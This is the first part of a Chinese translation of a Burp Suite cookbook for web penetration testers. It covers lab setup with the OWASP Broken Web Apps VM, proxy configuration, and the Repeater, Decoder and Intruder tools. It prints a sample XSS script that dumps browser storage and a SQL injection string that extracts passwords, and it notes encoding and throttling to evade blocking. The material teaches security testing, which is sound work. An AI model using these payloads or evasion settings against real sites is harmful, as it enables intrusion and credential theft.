# BurpSuite 秘籍（一）

> 原文：[`annas-archive.org/md5/F5CEDF1B62C77ADA57A482FA32099322`](https://annas-archive.org/md5/F5CEDF1B62C77ADA57A482FA32099322)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 前言

Burp Suite 是一个基于 Java 的平台，用于测试 Web 应用程序的安全性，并已被专业企业测试人员广泛采用。

Burp Suite Cookbook 包含了解决确定和探索 Web 应用程序中的漏洞挑战的配方。您将学习如何使用各种测试用例来发现复杂环境中的安全漏洞。在为您的环境配置 Burp 之后，您将使用 Burp 工具，如 Spider、Scanner、Intruder、Repeater 和 Decoder 等，来解决渗透测试人员面临的特定问题。您还将探索使用 Burp 的各种模式，并使用 Burp CLI 在 Web 上执行操作。最后，您将学习针对特定测试场景的配方，并使用最佳实践来解决它们。

通过本书，您将能够使用 Burp 来保护 Web 应用程序。

# 本书适合对象

如果您是安全专业人员、Web 渗透测试人员或软件开发人员，希望采用 Burp Suite 进行应用程序安全，那么本书适合您。

# 本书涵盖内容

第一章，“开始使用 Burp Suite”，提供了必要的设置说明，以便继续阅读本书的内容。

第二章，“了解 Burp Suite 工具”，从建立目标范围开始，并提供了 Burp Suite 中最常用工具的概述。

第三章，“使用 Burp 进行配置、爬行、扫描和报告”，帮助测试人员校准 Burp 设置，以减少对目标应用程序的侵害。

第四章，“评估身份验证方案”，涵盖了身份验证的基础知识，包括解释验证人员或对象声明的真实性。

第五章，“评估授权检查”，帮助您了解授权的基础知识，包括解释应用程序如何使用角色来确定用户功能。

第六章，“评估会话管理机制”，深入探讨了会话管理的基础知识，包括解释应用程序如何跟踪用户在网站上的活动。

第七章，“评估业务逻辑”，涵盖了业务逻辑测试的基础知识，包括对该领域中一些常见测试的解释。

第八章，“评估输入验证检查”，深入探讨了数据验证测试的基础知识，包括对该领域中一些常见测试的解释。

第九章，“攻击客户端”，帮助您了解客户端测试是如何关注在客户端上执行代码的，通常是在 Web 浏览器或浏览器插件中本地执行。学习如何使用 Burp 测试客户端上的代码执行，以确定是否存在跨站脚本（XSS）。

第十章，“使用 Burp 宏和扩展”，教会您如何使用 Burp 宏来使渗透测试人员自动化事件，如登录或响应参数读取，以克服潜在的错误情况。我们还将了解扩展作为 Burp 的附加功能。

第十一章，“实施高级主题攻击”，简要解释了 XXE 作为一个针对解析 XML 的应用程序的漏洞类别，以及 SSRF 作为一种允许攻击者代表自己强制应用程序发出未经授权请求的漏洞类别。

# 充分利用本书

每章的 *技术要求* 部分中更新了所有要求。

# 使用的约定

本书中使用了许多文本约定。

`CodeInText`：表示文本中的代码词、数据库表名、文件夹名、文件名、文件扩展名、路径名、虚拟 URL、用户输入和 Twitter 句柄。以下是一个例子：“允许攻击继续，直到达到有效载荷 `50`。”

代码块设置如下：

```
 <script>try{var m = "";var l = window.localStorage; var s =
window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m
+= lKey + "=" + l.getItem(lKey) +
";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "="
+ s.getItem(lKey) +
";\n";};alert(m);}catch(e){alert(e.message);}</script> 
```

任何命令行输入或输出均按以下方式编写：

```
 user'+union+select+concat('The+password+for+',username,'+is+',+pass
word),mysignature+from+accounts+--+ 
```

**粗体**：表示新术语、重要单词或屏幕上看到的单词。例如，菜单或对话框中的单词会以这种形式出现在文本中。以下是一个例子：“从下拉列表中选择一个工具，然后单击查找工具按钮。”

警告或重要说明会出现在这样的形式中。

提示和技巧会出现在这样的形式中。

# 章节

在本书中，您会经常看到几个标题（*准备工作*、*如何做*、*它是如何工作的*、*还有更多* 和 *另请参阅*）。

要清晰地说明如何完成食谱，请按以下部分使用：

# 准备工作

本节告诉您在食谱中可以期待什么，并描述如何设置任何软件或食谱所需的任何初步设置。

# 如何做...

本节包含遵循食谱所需的步骤。

# 它是如何工作的...

本节通常包括对前一节中发生的事情的详细解释。

# 还有更多...

本节包括有关食谱的其他信息，以使您对食谱更加了解。

# 另请参阅

本节提供有关食谱的其他有用信息的链接。


# 第一章：开始使用 Burp Suite

在本章中，我们将涵盖以下内容：

+   下载 Burp（社区，专业版）

+   设置 Web 应用程序渗透测试实验室

+   在命令行或可执行文件中启动 Burp

+   使用 Burp 监听 HTTP 流量

# 介绍

本章提供了设置说明，以便通过本书的材料进行学习。从下载 Burp 开始，详细内容包括两个主要的 Burp 版本及其特点。

要使用 Burp 套件，渗透测试人员需要一个目标应用程序。本章包括有关下载和安装**虚拟机**（**VM**）中包含的 OWASP 应用程序的说明。这些应用程序将在整本书中作为目标易受攻击的 Web 应用程序使用。

本章还包括配置 Web 浏览器以使用**Burp 代理监听器**。此监听器用于捕获 Burp 和目标 Web 应用程序之间的 HTTP 流量。监听器的默认设置包括一个**Internet Protocol**（**IP**）地址，`127.0.0.1`，和端口号`8080`。

最后，本章介绍了启动 Burp 的选项。这包括如何在命令行中启动 Burp，还有一个可选的无头模式，并使用可执行文件。

# 下载 Burp（社区，专业版）

学习本书中包含的技术的第一步是下载 Burp 套件。下载页面在这里可用（[`portswigger.net/burp/`](https://portswigger.net/burp/)）。您需要决定要从以下哪个版本的 Burp 套件中下载：

+   专业版

+   社区

+   企业版（未涵盖）

现在称为*社区*的东西曾被标记为*免费版*。您可能在互联网上看到两者的引用，但它们是一样的。在撰写本文时，专业版的价格为 399 美元。

为了帮助您做出决定，让我们来比较一下这两个版本。社区版提供了本书中使用的许多功能，但并非全部。例如，社区版不包括任何扫描功能。此外，使用入侵者功能时，社区版包含一些强制线程限制。社区版中没有内置的有效负载，但您可以加载自定义的有效负载。最后，一些需要专业版的 Burp 扩展显然在社区版中无法使用。

专业版具有包括被动和主动扫描器在内的所有功能。没有强制限制。**PortSwigger**（即编写和维护 Burp 套件的公司名称）提供了几个用于模糊测试和暴力破解的内置有效负载。专业版还可以使用与扫描器相关的 API 调用的 Burp 扩展。

在本书中，我们将使用专业版，这意味着社区版中的许多功能都可用。但是，当本书中使用专业版特有的功能时，将会有一个特殊的图标来指示。使用的图标如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00005.jpeg)

# 准备就绪

为了开始我们的冒险，前往[`portswigger.net/burp`](https://portswigger.net/burp)并下载您希望使用的 Burp 套件版本。该页面提供了一个滑块，如下所示，突出了专业版和社区版的功能，让您可以进行比较：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00006.jpeg)

许多读者可能会选择社区版以在购买之前熟悉该产品。 

如果您选择购买或试用专业版，您将需要填写表格或付款，并随后会收到确认电子邮件。创建账户后，您可以登录并从我们账户中提供的链接进行下载。

# 软件工具要求

要完成这个步骤，您将需要以下内容：

+   Oracle Java（[`www.java.com/en/download/`](https://www.java.com/en/download/)）

+   Burp Proxy Community 或 Professional（[`portswigger.net/burp/`](https://portswigger.net/burp/)）

+   Firefox 浏览器（[`www.mozilla.org/en-US/firefox/new/`](https://www.mozilla.org/en-US/firefox/new/)）

# 如何做...

在决定所需的版本后，您有两种安装选项，包括可执行文件或普通的 JAR 文件。可执行文件仅适用于 Windows，并提供 32 位或 64 位版本。普通的 JAR 文件适用于 Windows、macOS 和 Linux。

Windows 可执行文件是独立的，会在程序列表中创建图标。但是，普通的 JAR 文件需要您的平台预先安装 Java（[`www.java.com/en/download/`](https://www.java.com/en/download/)）。您可以选择当前版本的 Java（JRE 或 JDK），所以可以随意选择最新版本：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00007.jpeg)

# 建立一个网络应用渗透实验室

**Broken Web Application**（**BWA**）是一个 OWASP 项目，提供了一个自包含的虚拟机，其中包含各种已知漏洞的应用程序。该虚拟机中的应用程序使学生能够学习有关网络应用程序安全性，练习和观察网络攻击，并利用诸如 Burp 之类的渗透工具。

为了按照本书中显示的示例进行操作，我们将利用 OWASP 的 BWA 虚拟机。在撰写本文时，OWASP BWA 虚拟机可以从[`sourceforge.net/projects/owaspbwa/files/`](https://sourceforge.net/projects/owaspbwa/files/)下载。

# 准备工作

我们将下载 OWASP BWA 虚拟机以及支持工具来创建我们的网络应用渗透实验室。

# 软件工具要求

要完成这个示例，您需要以下内容：

+   Oracle VirtualBox（[`www.virtualbox.org/wiki/Downloads`](https://www.virtualbox.org/wiki/Downloads)）

+   选择适合您平台的可执行文件

+   Mozilla Firefox 浏览器（[`www.mozilla.org/en-US/firefox/new/`](https://www.mozilla.org/en-US/firefox/new/)）

+   7-Zip 文件压缩软件（[`www.7-zip.org/download.html`](https://www.7-zip.org/download.html)）

+   OWASP BWA 虚拟机（[`sourceforge.net/projects/owaspbwa/files/`](https://sourceforge.net/projects/owaspbwa/files/)）

+   Burp Proxy Community 或 Professional（[`portswigger.net/burp/`](https://portswigger.net/burp/)）

+   Oracle Java（[`www.java.com/en/download/`](https://www.java.com/en/download/)）

# 如何做...

对于这个示例，您需要下载 OWASP BWA 虚拟机，并通过以下步骤进行安装：

1.  点击前面提供的 OWASP BWA VM 的最新版本下载链接，并解压文件`OWASP_Broken_Web_Apps_VM_1.2.7z`。

1.  您将看到以下几个文件的列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00008.jpeg)

1.  所有显示的文件扩展名都表明该虚拟机可以导入到 Oracle VirtualBox 或 VMware Player/Workstation 中。为了设置本书中的网络应用渗透实验室，我们将使用 Oracle VirtualBox。

1.  记下`OWASP Broken Web Apps-cl1.vmdk`文件。打开 VirtualBox 管理器（即 Oracle VM VirtualBox 程序）。

1.  在 VirtualBox 管理器屏幕上，从顶部菜单中选择 Machine | New，然后为机器命名`OWASP BWA`。

1.  将类型设置为 Linux，版本设置为 Ubuntu（64 位），然后点击下一步，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00009.jpeg)

1.  下一个屏幕允许您调整 RAM 或按建议保持不变。点击下一步。

1.  在下一个屏幕上，选择使用现有的虚拟硬盘文件。

1.  使用右侧的文件夹图标选择从提取的列表中的`OWASP Broken Web Apps-cl1.vmdk`文件，然后点击创建，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00010.jpeg)

1.  您的虚拟机现在已加载到 VirtualBox 管理器中。让我们进行一些小的调整。突出显示**OWASP BWA**条目，然后从顶部菜单中选择设置。

1.  在左侧窗格中选择网络部分，然后更改为仅主机适配器。点击确定。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00011.jpeg)

1.  现在让我们启动虚拟机。右键单击，然后选择启动|正常启动。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00012.jpeg)

1.  等待 Linux 系统完全启动，这可能需要几分钟。启动过程完成后，您应该看到以下屏幕。但是，显示的 IP 地址将对您的机器有所不同：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00013.jpeg)

1.  此屏幕上显示的信息标识了您可以访问运行在虚拟机上的易受攻击的 Web 应用程序的 URL。例如，在上一张屏幕截图中，URL 是`http://192.168.56.101/`。您将收到一个用于管理虚拟机的提示，但此时无需登录。

1.  在您的主机系统上打开 Firefox 浏览器，而不是在虚拟机中。使用主机机器上的 Firefox 浏览器，输入提供的 URL（例如`http://192.168.56.101/`），其中 IP 地址特定于您的机器。

1.  在浏览器中，您将看到一个包含指向易受攻击的 Web 应用程序链接的索引页面。这些应用程序将在本书中用作目标：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00014.jpeg)

# 工作原理

利用 OWASP 创建的定制虚拟机，我们可以快速设置一个包含有意义地易受攻击的应用程序的 Web 应用程序渗透测试实验室，我们可以在本书中的练习中将其用作合法目标。

# 在命令行或作为可执行文件启动 Burp

对于非 Windows 用户或选择普通 JAR 文件选项的 Windows 用户，每次运行 Burp 时都需要在命令行上启动。因此，您需要一个特定的 Java 命令来执行此操作。

在某些情况下，例如自动化脚本，您可能希望在命令行中调用 Burp 作为 shell 脚本中的一项。此外，您可能希望在没有图形用户界面（GUI）的情况下运行 Burp，即所谓的无头模式。本节描述了如何执行这些任务。

# 操作步骤如下...

我们将回顾启动 Burp Suite 产品所需的命令和操作。

1.  在 Windows 中启动 Burp，从下载的`.exe`文件运行安装程序后，双击桌面上的图标或从程序列表中选择它：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00015.jpeg)

使用普通的 JAR 文件时，可执行文件`java`后面跟着`-jar`选项，然后是下载的 JAR 文件的名称。

1.  在命令行上启动 Burp（最小化）并使用普通的 JAR 文件（必须先安装 Java）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00016.gif)

如果您希望更多地控制堆大小设置（即为程序分配的内存量），可以修改`java`命令。

1.  `java`可执行文件后面跟着`-jar`，然后是内存分配。在这种情况下，分配了 2GB（即`2g`）用于随机存取内存（RAM），然后是 JAR 文件的名称。如果出现无法分配那么多内存的错误，请将分配量降低到 1024MB（即`1024m`）。

1.  在命令行上启动 Burp（优化）并使用普通的 JAR 文件（必须先安装 Java）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00017.gif)

1.  可以在命令行上启动 Burp 并以无头模式运行。无头模式意味着在没有 GUI 的情况下运行 Burp。

出于本书的目的，我们不会以无头模式运行 Burp，因为我们是通过 GUI 学习的。但是，您将来可能需要这些信息，这就是为什么它在这里呈现的原因。

1.  在命令行上启动 Burp 以无头模式运行，并使用普通的 JAR 文件（必须先安装 Java）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00018.gif)

请注意，在`-jar`选项之后并在 JAR 文件的名称之前，立即放置参数`-Djava.awt.headless=true`。

1.  如果成功，您应该看到以下内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00019.gif)

按下*Ctrl* + *C*或*Ctrl* + *Z*停止该进程。

1.  可以为无头模式命令提供一个配置文件，用于自定义代理侦听器所在的端口号和 IP 地址。

请参阅 PortSwigger 的支持页面，了解有关此主题的更多信息：[`support.portswigger.net/customer/portal/questions/16805563-burp-command-line`](https://support.portswigger.net/customer/portal/questions/16805563-burp-command-line)。

1.  在描述的每个启动场景中，您应该会看到一个**启动屏幕**。启动屏幕标签将与您决定下载的版本匹配，无论是专业版还是社区版。

1.  您可能会收到更新版本的提示；如果愿意，可以随意进行更新。不断添加新功能到 Burp 中，以帮助您发现漏洞，因此升级应用程序是一个好主意。如果适用，选择立即更新。

1.  接下来，您将看到一个对话框，询问有关项目文件和配置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00020.jpeg)

1.  如果您使用的是社区版，您只能创建一个临时项目。如果您使用的是专业版，请在适合您查找的位置创建一个新项目并将其保存在磁盘上。然后单击“下一步”。

1.  随后的启动屏幕会询问您想要使用的配置。在这一点上，我们还没有任何配置，所以选择使用 Burp 默认值。随着您阅读本书的进展，您可能希望保存配置设置，并在将来从此启动屏幕加载它们，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00021.jpeg)

1.  最后，我们准备好单击“启动 Burp”。

# 工作原理...

使用普通的 JAR 文件或 Windows 可执行文件，您可以启动 Burp 以启动代理监听器来捕获 HTTP 流量。Burp 提供临时或永久的项目文件，以保存套件中执行的活动。

# 使用 Burp 监听 HTTP 流量

Burp 被描述为一个拦截代理。这意味着 Burp 位于用户的 Web 浏览器和应用程序的 Web 服务器之间，并拦截或捕获它们之间流动的所有流量。这种行为通常被称为**代理服务**。

渗透测试人员使用拦截代理来捕获流动在 Web 浏览器和 Web 应用程序之间的流量，以进行分析和操作。例如，测试人员可以暂停任何 HTTP 请求，从而允许在将请求发送到 Web 服务器之前篡改参数。

拦截代理，如 Burp，允许测试人员拦截 HTTP 请求和 HTTP 响应。这使测试人员能够观察 Web 应用程序在不同条件下的行为。正如我们将看到的，有时行为与原始开发人员的预期不符。

为了看到 Burp 套件的实际操作，我们需要配置我们的 Firefox 浏览器的网络设置，指向我们运行的 Burp 实例。这使 Burp 能够捕获浏览器和目标 Web 应用程序之间流动的所有 HTTP 流量。

# 准备就绪

我们将配置 Firefox 浏览器，允许 Burp 监听浏览器和 OWASP BWA VM 之间流动的所有 HTTP 流量。这将允许 Burp 中的代理服务捕获用于测试目的的流量。

PortSwigger 网站上提供了有关此主题的说明（[`support.portswigger.net/customer/portal/articles/1783066-configuring-firefox-to-work-with-burp`](https://support.portswigger.net/customer/portal/articles/1783066-configuring-firefox-to-work-with-burp)），我们也将在下面的步骤中逐步介绍该过程。

# 操作步骤...

以下是您可以通过的步骤，使用 Burp 监听所有 HTTP 流量：

1.  打开 Firefox 浏览器并转到选项。

1.  在“常规”选项卡中，向下滚动到“网络代理”部分，然后单击“设置”。

1.  在“连接设置”中，选择“手动代理配置”，并输入 IP 地址`127.0.0.1`和端口`8080`。选择“为所有协议使用此代理服务器”复选框：

1.  确保“不使用代理”文本框为空，如下图所示，然后单击“确定”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00022.jpeg)

1.  在 OWASP BWA VM 在后台运行并使用 Firefox 浏览到特定于您的机器的 URL（即在 VirtualBox 中 Linux VM 上显示的 IP 地址）时，单击重新加载按钮（圆圈中的箭头）以查看在 Burp 中捕获的流量。

1.  如果您没有看到任何流量，请检查代理拦截是否阻止了请求。如果标记为“拦截”的按钮处于按下状态，如下面的屏幕截图所示，则再次单击该按钮以禁用拦截。这样做后，流量应该自由地流入 Burp，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00023.jpeg)

在下面的 Proxy | 拦截按钮被禁用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00024.jpeg)

1.  如果一切正常，您将在目标|站点地图选项卡上看到类似于以下屏幕截图所示的流量。当然，您的 IP 地址将不同，并且您的站点地图中可能会显示更多项目。恭喜！您现在已经让 Burp 监听您浏览器的所有流量了！

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00025.jpeg)

# 工作原理...

Burp 代理服务正在监听`127.0.0.1`端口`8080`。这些设置中的任何一个都可以更改为监听替代 IP 地址或端口号。但是，为了学习的目的，我们将使用默认设置。


# 第二章：了解 Burp Suite 工具

在本章中，我们将介绍以下内容：

+   设置目标站点地图

+   了解消息编辑器

+   使用重复器进行重复

+   使用解码器进行解码

+   使用入侵者进行入侵

# 介绍

本章概述了 Burp Suite 中最常用的工具。该章节首先在目标站点地图中建立目标范围。然后，介绍消息编辑器。接下来，将使用**OWASP Mutillidae II**进行一些实际操作，以熟悉代理、重复器、解码器和入侵者。

# 软件工具要求

要完成本章的实际操作，您需要以下内容：

+   Burp 代理社区或专业版（[`portswigger.net/burp/`](https://portswigger.net/burp/)）

+   配置为允许 Burp 代理流量的 Firefox 浏览器（[`www.mozilla.org/en-US/firefox/new/`](https://www.mozilla.org/en-US/firefox/new/)）

# 设置目标站点地图

现在我们的浏览器、Burp 和 OWASP BWA 虚拟机之间有流量流动，我们可以开始设置我们测试的范围。对于本教程，我们将使用 OWASP BWA VM 中提供的 OWASP Mutillidae II 链接（`http://<Your_VM_Assigned_IP_Address>/mutillidae/`）作为我们的目标应用程序。

更仔细地查看目标选项卡，您会注意到有两个可用的子选项卡：站点地图和范围。从浏览器、Burp 和 Web 服务器之间的初始代理设置开始，您现在应该在目标|站点地图选项卡中看到一些 URL、文件夹和文件。您可能会发现信息量很大，但为我们的项目设置范围将有助于更好地集中我们的注意力。

# 准备工作

使用目标|站点地图和目标|范围选项卡，我们将为 mutillidae（`http://<Your_VM_Assigned_IP_Address>/mutillidae/`）分配 URL 作为**范围。**

# 如何做...

执行以下步骤设置目标站点地图：

1.  搜索文件夹`mutillidae`，右键单击“添加到范围”。注意目标|范围子选项卡的简要高亮显示，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00026.jpeg)

1.  将文件夹`mutillidae`添加到您的范围后，您可能会看到一个代理历史记录对话框，如下所示。您可以通过单击“是”来避免收集超出范围的消息。或者，您可以选择继续使**代理 HTTP 历史**表收集通过 Burp 传递的任何消息，即使这些消息超出了您已识别的范围。对于我们的目的，我们将选择**是**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00027.jpeg)

1.  切换到目标|范围选项卡，您现在应该在包含范围表中看到 OWASP Mutillidae II 的完整 URL，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00028.jpeg)

# 它是如何工作的...

消息编辑器显示通过代理侦听器流经的任何 HTTP 消息的详细信息。设置代理以捕获 HTTP 流量后，如在目标|站点地图和 Burp 代理|HTTP 历史选项卡中所见，您可以选择任何单个消息以显示消息编辑器。每个编辑器都包含消息的请求和响应方面，只要消息通过 Burp 正确代理。

# 了解消息编辑器

在 Burp Suite 中几乎每个显示 HTTP 消息的工具和选项卡中，您都会看到一个标识请求和响应的编辑器。这通常被称为消息编辑器。消息编辑器允许查看和编辑具有特殊功能的 HTTP 请求和响应。

消息编辑器中有多个子选项卡。请求消息的子选项卡至少包括以下内容：

+   **原始**

+   **标头**

+   **十六进制**

响应消息的子选项卡包括以下内容：

+   **原始**

+   **标头**

+   **十六进制**

+   **HTML**（有时）

+   **渲染**（有时）

原始选项卡以原始 HTTP 形式显示消息。标头选项卡以表格格式显示 HTTP 标头参数。这些参数是可编辑的，并且可以在工具（如代理和重复器）的表格中添加、删除或修改列。

对于包含参数或 cookie 的请求，参数选项卡是存在的。参数是可编辑的，并且可以在工具（如代理和 Repeater）中的表格中添加、删除或修改列。

最后，还有十六进制选项卡，以十六进制格式呈现消息；实质上是一个十六进制编辑器。您可以在工具（如代理和 Repeater）中编辑单个字节，但这些值必须以两位十六进制形式给出，从 00 到 FF。

# 准备工作

让我们探索 Burp 中捕获的每个请求和响应的消息编辑器中可用的多个选项卡。

# 操作步骤...

确保您的浏览器、Burp 和 OWASP BWA 虚拟机之间有流量流动。

1.  查看目标 | 站点地图选项卡，注意消息编辑器部分：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00029.jpeg)

1.  查看请求时，请注意可用的子选项卡至少包括原始、标头和十六进制。然而，在包含参数或 cookie 的请求的情况下，参数子选项卡也是可用的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00030.jpeg)

1.  消息的另一侧是**响应**选项卡，包括**原始**，**标头**，**十六进制**子选项卡，有时还包括**HTML**和**渲染**。这些是提供给 HTTP 响应的各种格式。如果内容是 HTML，那么选项卡将出现。同样，**渲染**选项卡使 HTML 显示为在浏览器中呈现的样子，但不执行任何 JavaScript：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00031.jpeg)

# 使用 Repeater 重复

Repeater 允许对请求进行轻微更改或调整，并显示在左侧窗口中。**Go**按钮允许重新发出请求，并在右侧窗口中显示响应。

与您的 HTTP 请求相关的详细信息包括标准的消息编辑器详细信息，如**原始**，**参数**（对于带有参数或 cookie 的请求），**标头**和**十六进制**。

与 HTTP 响应相关的详细信息包括标准的消息编辑器详细信息，包括**原始**，**标头**，**十六进制**，有时还包括**HTML**和**渲染**。

在每个面板的底部都有一个搜索文本框，允许测试人员快速找到消息中存在的值。

# 准备工作

Repeater 允许您手动修改并重新发出单个 HTTP 请求，分析您收到的响应。

# 操作步骤...

1.  从**目标** | **站点地图**或从**代理** | **HTTP 历史**选项卡（如下截图所示）中，右键单击消息，然后选择**发送到 Repeater**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00032.jpeg)

1.  切换到**Repeater**选项卡。注意**HTTP 请求**已准备好供测试人员调整参数，然后通过**Go**按钮将请求发送到应用程序。

注意每个面板底部的搜索框：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00033.jpeg)

我们将在本书中经常使用 Repeater。本章只是对 Repeater 的介绍，以及了解其目的。

# 使用解码器进行解码

**Burp 解码器**是一个工具，允许测试人员将原始数据转换为编码数据，或者将编码数据转换回纯文本。解码器支持包括 URL 编码、HTML 编码、Base64 编码、二进制代码、哈希数据等在内的多种格式。解码器还包括内置的十六进制编辑器。

# 准备工作

随着网络渗透测试的进行，测试人员可能会遇到编码值。Burp 通过允许测试人员将编码值发送到解码器并尝试各种可用的解码功能来简化解码过程。

# 操作步骤...

让我们尝试解码在 OWASP Mutillidae II 应用程序中找到的会话令牌 PHPSESSID 的值。当用户最初浏览到 URL（`http://<Your_VM_Assigned_IP_Address>/mutillidae/`）时，该用户将被分配一个 PHPSESSID cookie。PHPSESSID 值似乎被加密，然后包裹在 base 64 编码中。使用解码器，我们可以解开该值。

1.  浏览到`http://<Your_VM_Assigned_IP_Address>/mutillidae/`应用程序。

1.  在**代理** | **HTTP 历史**选项卡中找到您刚刚从浏览器生成的 HTTP 请求（如下一张截图所示）。突出显示 PHPSESSID 值，而不是参数名称，右键单击，并选择**发送到解码器**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00034.jpeg)

1.  在**解码器**选项卡中，在**解码为...**下拉菜单中，选择**Base 64**。注意结果在**Hex**编辑器中查看并且已加密：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00035.jpeg)

在这个示例中，我们无法进一步进行。我们可以确认值确实被包裹在 Base 64 中。然而，解包的值是加密的。本示例的目的是向您展示如何使用解码器来操作编码的值。

# 使用 Burp Intruder 进行攻击

Burp Intruder 允许测试人员对 HTTP 消息的特定部分进行暴力破解或模糊测试，使用定制的负载。

为了正确设置 Intruder 中的定制攻击，测试人员需要使用**Intruder**的四个子选项卡中提供的设置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00036.jpeg)

# 准备工作

测试人员可能希望在消息中模糊测试或暴力破解参数值。Burp Intruder 通过提供各种入侵者攻击样式、负载和选项来简化这个过程。

# 操作步骤...

1.  浏览到 Mutillidae 的登录界面，并尝试登录应用程序。例如，输入用户名`admin`和密码`adminpass`。

1.  在**代理** | **HTTP 历史**选项卡中找到登录尝试。您的请求编号（即左侧的**#**标志）将与下面显示的不同。选择捕获您尝试登录的消息。

1.  当登录尝试消息在**HTTP 历史**表中被突出显示时，右键单击**请求**选项卡，并选择**发送到 Intruder**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00037.jpeg)

# 目标

Intruder 的**目标**选项卡定义了您的目标 Web 应用程序。这些设置由 Burp 预先为您填充：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00038.jpeg)

# 位置

**位置**选项卡标识出**负载** | **位置**部分中的负载标记的位置。对于我们的目的，从右侧菜单中点击**清除§**（即负载标记）。使用鼠标手动选择密码字段。现在点击右侧菜单中的**添加§**按钮。您应该看到负载标记包裹在密码字段周围，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00039.jpeg)

# 负载

**位置**选项卡之后是**负载**选项卡。**负载**选项卡标识出您希望插入到上一个选项卡中标识的位置的单词列表值或数字。**负载**选项卡中有几个部分，包括**负载集**、**负载选项**、**负载处理**和**负载编码**。

# 负载集

**负载集**允许设置负载的数量和类型。对于我们的目的，我们将使用 Sniper 的默认设置，允许我们使用一个**负载类型**为**简单列表**的负载：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00040.jpeg)

# 负载选项

在**负载选项**部分，测试人员可以配置自定义负载或从文件中加载预配置的负载。

为了我们的目的，我们将向我们的负载添加一个值。在文本框中输入`admin`，然后单击**添加**按钮来创建我们的自定义负载：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00041.jpeg)

# 负载处理

负载处理在配置特殊规则用于替换负载标记位置时非常有用。对于这个示例，我们不需要任何特殊的负载处理规则：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00042.jpeg)

# 负载编码

负载编码是在将请求发送到 Web 服务器之前应用于负载值的。许多 Web 服务器可能会阻止攻击性的负载（例如`<script>`标签），因此编码功能是绕过任何黑名单阻止的手段。

出于本示例的目的，保持默认框被选中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00043.jpeg)

# 选项

最后，**Intruder** | **选项**选项卡提供了攻击表的自定义设置，特别是与捕获的响应相关的特定错误消息。**Intruder** | **选项**选项卡中有几个部分，包括**请求头**、**请求引擎**、**攻击结果**、**Grep-Match**、**Grep-Extract**、**Grep - Payloads**和**重定向**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00044.jpeg)

# 请求头

**请求头**提供了在 Intruder 运行攻击时特定于头部参数的配置。为了这个食谱的目的，保持默认复选框选中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00045.jpeg)

# 请求引擎

**请求引擎**应该被修改，如果测试人员希望在运行 Intruder 时在网络上减少噪音。例如，测试人员可以使用可变的时间间隔来限制攻击请求，使它们对网络设备看起来更随机。这也是降低 Intruder 对目标应用程序运行的线程数的位置。

为了这个食谱的目的，保持默认设置不变：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00046.jpeg)

# 攻击结果

